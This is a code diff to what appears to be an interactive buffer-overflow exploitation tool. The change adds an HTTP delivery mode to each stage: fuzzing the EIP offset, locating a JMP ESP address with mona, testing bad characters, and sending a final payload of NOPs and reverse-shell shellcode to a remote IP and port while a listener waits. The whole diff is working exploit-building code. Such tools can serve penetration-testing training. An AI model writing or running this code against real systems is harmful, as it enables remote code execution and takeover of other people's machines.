@@ -226,7 +226,12 @@ class Classic:
             #     gonext = "n"
             #     while gonext == "n":
 
-            buffer = self.fill_classic(self.config.offset)
+            if (self.config.mode == "http"):
+                buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field, self.fill_classic(self.config.offset),
+                                              self.config.shellcode, self.offset)
+            else:
+                buffer = self.fill_classic(self.config.offset)
+
             # gonext = System.input("[?] Buffer is aligned in EIP: [Y]es/[N]o?")
 
             if (self.config.verbose_lv >= 1):
@@ -248,7 +253,13 @@ class Classic:
                     print("[!] Hint: !mona jmp -r esp -n")
                     self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address (without 0x) :")
 
-                    buffer = self.fill_classic_jmp_esp(self.config.offset, self.config.jmpesp_add)
+                    if (self.config.mode == "http"):
+                        buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
+                                                      self.fill_classic_jmp_esp(self.config.offset, self.config.jmpesp_add),
+                                                      self.config.shellcode, self.offset)
+                    else:
+                        buffer = self.fill_classic_jmp_esp(self.config.offset, self.config.jmpesp_add)
+
                     gonext = System.input("[!] All set! Press ENTER when your debugger is ready to receive a JMP ESP in EIP :")
                     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                     print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to test STACK FILLING!!!")
@@ -285,7 +296,12 @@ class Classic:
             gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip:")
 
             if(gonext == "T"):
-                exploit = self.fill_classic_bytearray(self.config.offset, self.config.jmpesp_add)
+                if (self.config.mode == "http"):
+                    exploit = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
+                                                  self.fill_classic_bytearray(self.config.offset, self.config.jmpesp_add),
+                                                  self.config.shellcode, self.offset)
+                else:
+                    exploit = self.fill_classic_bytearray(self.config.offset, self.config.jmpesp_add)
 
                 System.input("[?] Press any key when you wanna send the bytearray !!!")
                 inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
@@ -308,7 +324,13 @@ class Classic:
             print("[!] Preparing Shellcode for reverse shell.....")
 
             self.config.shellcode = System.shellcode(self.config)
-            exploit = self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops, self.config.shellcode)
+
+            if (self.config.mode == "http"):
+                exploit = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
+                                               self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops, self.config.shellcode),
+                                               self.config.shellcode, self.offset)
+            else:
+                exploit = self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops, self.config.shellcode)
 
             print("[!] Spawn listener on " + self.config.localip + ":" + str(self.config.localport))
             gonext = System.input("[?] Press any key when you wanna give the shot!!! This will send the FINAL PAYLOAD now!!!")
